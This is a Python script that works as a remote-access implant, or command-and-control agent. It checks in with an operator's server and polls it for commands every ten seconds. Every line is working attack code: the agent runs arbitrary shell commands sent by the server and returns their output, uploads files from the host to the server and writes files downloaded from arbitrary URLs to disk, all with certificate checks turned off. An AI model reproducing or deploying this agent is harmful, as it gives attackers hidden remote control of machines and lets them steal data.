import requests
import base64
import sys
import time
import subprocess
import os
from urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
uid = sys.argv[1]
url = sys.argv[2]

message = "Hello From Agent " + uid + " (Python)"
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

hello = requests.get(url + "/res.php?res=" + base64_message + "&id="+uid, verify=False)

while True:
	cmds = requests.get(url + "/cmds.php?id="+uid+"&o=P", verify=False)
	cmds = str(cmds.text)
	for lines in cmds.splitlines():
		if str(uid) in lines:
			act=str(lines.split(":",2)[1])
			if act == "run":
				cmd = str(lines.split(":",2)[2])
				cmdlist = cmd.split(" ")
				res = subprocess.check_output(cmdlist)
				res = res.decode("utf-8")
				res_bytes = res.encode('ascii')
				resbase64_bytes = base64.b64encode(res_bytes)
				resbase64 = resbase64_bytes.decode('ascii')
				gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
				
			if act == "download":
				filedl = str(lines.split(":",2)[2]).strip()
				filenamedl = os.path.split(filedl)[-1]
				messagedl = "Uploading "+ str(filedl)
				messagedl_bytes = messagedl.encode('ascii')
				base64_bytes = base64.b64encode(messagedl_bytes)
				base64_messagedl = base64_bytes.decode('ascii')
				multipart_form_data = {
   				'data': (str(filenamedl).strip(), open(filedl, 'rb')),
				}
				tellme = requests.get(url + "/res.php?res=" + base64_messagedl + "&id="+uid, verify=False)
				gimme = requests.post(url + "/up.php?id="+uid, files=multipart_form_data , verify=False)
			
			
			if act == "upload":
				s = ":"
				urldl = s.join({str(lines.split(":",4)[3]).strip(), str(lines.split(":",5)[2]).strip()})
				
				path =  str(lines.split(":",5)[-1]).strip()
				print(urldl)
				print(path)
				messagedl = "Downloading "+ str(urldl) + " to "+ path
				messagedl_bytes = messagedl.encode('ascii')
				base64_bytes = base64.b64encode(messagedl_bytes)
				base64_messagedl = base64_bytes.decode('ascii')
				tellme = requests.get(url + "/res.php?res=" + base64_messagedl + "&id="+uid, verify=False)
				takethis = requests.get(urldl, verify=False)
				with open(path, 'wb') as f:
    					f.write(takethis.content)
	
	
	time.sleep(10)
		
